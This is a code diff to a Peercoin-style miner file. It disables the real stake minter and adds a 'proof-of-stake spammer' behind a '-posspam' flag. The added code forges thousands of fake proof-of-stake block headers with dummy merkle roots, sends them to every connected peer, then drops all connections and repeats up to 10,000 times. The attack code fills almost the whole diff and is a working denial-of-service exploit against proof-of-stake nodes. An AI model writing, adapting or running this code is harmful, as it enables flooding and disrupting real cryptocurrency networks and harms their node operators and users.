@@ -35,6 +35,9 @@
 
 #include <boost/thread.hpp>
 
+#include "netmessagemaker.h"
+#include "bignum.h"
+
 //////////////////////////////////////////////////////////////////////////////
 //
 // BitcoinMiner
@@ -508,6 +511,105 @@ static bool ProcessBlockFound(const CBlock* pblock, const CChainParams& chainpar
     return true;
 }
 
+/* pos spam code */
+
+unsigned int GetNextTargetRequiredEx(int64_t nActualSpacing, uint32_t nBits, const Consensus::Params& params)
+{
+    using namespace std;
+
+    // ppcoin: target change every block
+    // ppcoin: retarget with exponential moving toward target spacing
+    CBigNum bnNew;
+    bnNew.SetCompact(nBits);
+
+    int64_t nTargetSpacing = params.nStakeTargetSpacing;
+    int64_t nInterval = params.nTargetTimespan / nTargetSpacing;
+
+    int n = 1;
+    bnNew *= ((nInterval - n) * nTargetSpacing + (n + 1) * nActualSpacing);
+    bnNew /= ((nInterval + 1) * nTargetSpacing);
+
+    if (bnNew > CBigNum(params.powLimit))
+        bnNew = CBigNum(params.powLimit);
+
+    return bnNew.GetCompact();
+}
+
+void PoSMiner(CWallet *pwallet)
+{
+    if (!gArgs.GetBoolArg("-posspam", false))
+        return;
+
+    LogPrintf("proof-of-stake spammer\n");
+
+    static uint32_t nNonce = 0;
+    CBlockIndex* pChainTip = chainActive.Tip();
+
+    CBlockIndex* pindexPrev = pChainTip;
+    for (int i = 0; i < 950; i++) {
+        pindexPrev = pindexPrev->pprev;
+    }
+
+    while (!pindexPrev->IsProofOfStake() || !pindexPrev->pprev->IsProofOfStake()) {
+        pindexPrev = pindexPrev->pprev;
+    }
+
+    for (int j = 0; j < 10000; j++) {
+        uint256 prevHash = pindexPrev->GetBlockHash();
+
+        int64_t nActualSpacing = pindexPrev->GetBlockTime() - pindexPrev->pprev->GetBlockTime();
+        uint32_t nBits = GetNextTargetRequiredEx(nActualSpacing, pindexPrev->nBits, Params().GetConsensus());
+
+        int64_t nSpacing = Params().GetConsensus().nStakeTargetSpacing;
+        uint32_t nTime = pindexPrev->nTime + nSpacing;
+
+        CBlockHeader lastBlock;
+        std::vector<CBlock> vHeaders;
+        for (int i = 0; i < 740; i++) {
+            CBlockHeader block;
+            block.nVersion       = CBlockHeader::CURRENT_VERSION;// | (AUXPOW_CHAIN_ID * BLOCK_VERSION_CHAIN_START);
+            block.hashPrevBlock  = prevHash;
+            block.hashMerkleRoot = prevHash; //dummy value
+            block.nTime          = nTime;
+            block.nBits          = nBits;
+            block.nNonce         = nNonce++;
+            block.nFlags         = CBlockIndex::BLOCK_PROOF_OF_STAKE;
+
+            nTime += nSpacing;
+            prevHash = block.GetHash();
+            nBits = GetNextTargetRequiredEx(nSpacing, nBits, Params().GetConsensus());
+
+            lastBlock = block;
+            vHeaders.push_back(block);
+        }
+
+        g_connman->ForEachNode([&vHeaders](CNode* pnode) {
+            const CNetMsgMaker msgMaker(pnode->GetSendVersion());
+            g_connman->PushMessage(pnode, msgMaker.Make(NetMsgType::HEADERS, vHeaders));
+        });
+
+        g_connman->ForEachNode([&vHeaders](CNode* pnode) {
+            g_connman->DisconnectNode(pnode->GetId());
+        });
+
+        int k = 0;
+        while (g_connman->GetNodeCount(CConnman::CONNECTIONS_ALL) != 0) {
+            k++;
+            MilliSleep(10);
+
+            if (k > 50) {
+                break;
+            }
+        }
+
+        while (g_connman->GetNodeCount(CConnman::CONNECTIONS_ALL) == 0) {
+            MilliSleep(100);
+        }
+    }
+    return;
+}
+
+/*
 void PoSMiner(CWallet *pwallet)
 {
     LogPrintf("CPUMiner started for proof-of-stake\n");
@@ -617,6 +719,7 @@ void PoSMiner(CWallet *pwallet)
         return;
     }
 }
+*/
 
 // peercoin: stake minter thread
 void static ThreadStakeMinter(void* parg)
